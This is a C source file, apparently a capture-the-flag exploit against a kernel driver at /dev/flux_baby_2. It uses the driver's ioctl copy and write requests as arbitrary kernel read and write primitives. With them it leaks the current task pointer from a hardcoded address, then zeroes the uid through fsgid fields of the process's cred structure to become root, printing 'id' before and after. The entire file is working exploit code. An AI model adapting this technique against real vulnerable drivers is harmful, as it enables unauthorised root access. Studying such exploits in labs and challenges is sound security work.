#define GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>


#define COPY_REQUEST 0x385
#define WRITE_REQUEST 0x386

#define CURRENT_TASK_ADDR ((void*) 0xffffffff8183a040)

#define EFF_CRED_TASK_STRUCT_OFST 0x400
#define UID_CRED_OFST 0x4
#define FSGID_CRED_OFST 0x20



struct read_arg_t {
    char* from;
    char* to;
};

struct write_arg_t {
    char *ptr;
    unsigned long val;
};


int fd;

int driver_read(void* to, void* from) {
    int err;
    struct read_arg_t read_arg;
    
    read_arg.from = from;
    read_arg.to = to;

    err = ioctl(fd, COPY_REQUEST, &read_arg);
    if (err < 0) {
        perror("[-] ioctl COPY_REQUEST\n");
        goto fail;
    }
    printf("[+] Copied 8 bytes from: %p, to: %p\n", from, to);

    return 0;
fail:
    return -1;
}

int driver_write(void *ptr, unsigned long val) {
    int err;
    struct write_arg_t write_arg;

    write_arg.ptr = ptr;
    write_arg.val = val;

    err = ioctl(fd, WRITE_REQUEST, &write_arg);
    if (err < 0) {
        perror("[-] ioctl WRITE_REQUEST\n");
        goto fail;
    }
    printf("[+] Set value under address: %p to val: %lu\n", ptr, val);

    return 0;
fail:
    return -1;
}

/* Escalate process privilages by overwriting current_task->cred->uid */
int escalate() {
    int err;
    u_int64_t current;
    u_int64_t current_creds;

    err = driver_read(&current, CURRENT_TASK_ADDR);
    if (err < 0) {
        perror("[-] leak address of current\n");
        goto fail;
    }
    printf("[+] Leaked address of current: %p\n", current);

    err = driver_read(&current_creds, current + EFF_CRED_TASK_STRUCT_OFST);
    if (err < 0) {
        perror("[-] current creds addr\n");
        goto fail;
    }
    printf("[+] Leaked current_creds address: %p\n", current_creds);

    printf("[i] Before overwriting current->cred structure our process id is user:\n");
    system("id;");
    for (size_t ofst = UID_CRED_OFST; ofst <= FSGID_CRED_OFST; ofst += 0x8) {
        err = driver_write(current_creds + ofst, 0);
        if (err < 0) {
            perror("[-] Failed to overwrite creds\n");
            goto fail;
        }
    }
    printf("[i] After overwriting current->cred structure our process id shoud be root:\n");
    system("id;");

    return 0;
fail:
    return -1;
}

int main() {
    int err;

    fd = open("/dev/flux_baby_2", O_RDWR, 0);
    if (fd < 0) {
        perror("[-] open /dev/flux_baby_2\n");
        goto fail;
    }
    printf("[+] Opened device /dev/flux_baby_2, fd assigned: %d\n", fd);

    err = escalate();
    if (err < 0) {
        perror("[-] Failed to escalate privilages\n");
        goto fail;
    }

    close(fd);
    return 0;

fail:
    return -1;
}
